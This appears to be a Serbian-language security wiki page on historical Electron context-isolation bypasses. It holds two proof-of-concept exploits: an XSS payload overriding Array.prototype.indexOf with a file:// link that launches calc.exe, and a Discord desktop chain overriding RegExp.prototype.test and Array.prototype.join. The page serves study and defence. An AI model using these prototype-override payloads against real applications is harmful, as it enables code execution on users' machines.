# Electron contextIsolation RCE putem preload koda

{{#include ../../banners/hacktricks-training.md}}

Ovo su **istorijski lanci** u kojima je preload kod delio JavaScript intrinsics ili privilegovane API-je sa sadržajem renderer-a pod kontrolom napadača. Kada je context isolation omogućen, preload i stranica obično imaju odvojene JavaScript realm-ove, pa izmene prototipa na stranici ne utiču automatski na preload objekte. Proverite lanac u odnosu na tačnu verziju Electron-a/aplikacije i implementaciju bridge-a.<sup>[[3]](#references)</sup>

## Primer 1

Primer sa [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)<sup>[[1]](#references)</sup>

Ovaj kod otvara http(s) linkove podrazumevanim pregledačem:

![Electron contextIsolation RCE putem preload koda - Primer 1: Ovaj kod otvara http(s) linkove podrazumevanim pregledačem](<../../images/image (768).png>)

U pogođenoj istorijskoj aplikaciji, navigacija do lokalne datoteke, kao što je `file:///C:/Windows/System32/calc.exe`, mogla je da pokrene putanju za pokretanje OS-a; `SAFE_PROTOCOLS.indexOf` je trebalo to da spreči.

Zato je napadač mogao da ubaci ovaj JS kod putem XSS-a ili proizvoljne navigacije stranice:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

Pošto će poziv `SAFE_PROTOCOLS.indexOf` uvek vratiti 1337, napadač može da zaobiđe zaštitu i pokrene calc. Konačni exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

Proverite originalne slajdove i potražite druge načine za izvršavanje programa bez upita za dozvolu.<sup>[[1]](#references)</sup>

Istorijski Discord lanac napada razmatrao je i učitavanje u UNC stilu pomoću `file://127.0.0.1/electron/rce.jar` kao drugi potencijalni put za izvršavanje; proverite dostupnost na konkretnoj verziji Windows-a/Electron-a.<sup>[[2]](#references)</sup>

## Primer 2: RCE u aplikaciji Discord

Primer sa [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)<sup>[[2]](#references)</sup>

Prilikom provere preload skripti, otkrio sam da Discord izlaže web stranici funkciju koja omogućava pozivanje nekih dozvoljenih modula putem `DiscordNative.nativeModules.requireModule('MODULE-NAME')`.\
Ovde nisam mogao da koristim module koji se mogu direktno upotrebiti za RCE, kao što je modul _child_process_, ali **otkrio sam kod pomoću kojeg se RCE može postići prepisivanjem ugrađenih JavaScript metoda** i ometanjem izvršavanja izloženog modula.

U nastavku je PoC. Potvrdio sam da se aplikacija **calc** **otvara** kada iz devTools p**ozovem funkciju `getGPUDriverVersions`**, definisanu u modulu pod nazivom "_discord_utils_", dok **prepisujem `RegExp.prototype.test` i `Array.prototype.join`**.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

Funkcija `getGPUDriverVersions` pokušava da izvrši program koristeći biblioteku „_execa_“, kao što je prikazano u nastavku:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Obično _execa_ pokušava da izvrši "_nvidia-smi.exe_", koji je naveden u promenljivoj `nvidiaSmiPath`. Međutim, zbog prepravljenih metoda `RegExp.prototype.test` i `Array.prototype.join`, **argument se u internom procesu obrade u _execa_ zamenjuje sa "**_**calc**_**"**.

Konkretno, argument se zamenjuje uticajem na putanje za razrešavanje komande i obradu argumenata u istorijskom parseru `cross-spawn`.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Zloupotreba nedostatka izolacije konteksta - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [RCE u Discord desktop aplikaciji](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Izolacija konteksta](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn`: revizija parsera i tačne putanje korišćene u lancu (redovi 36–55)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
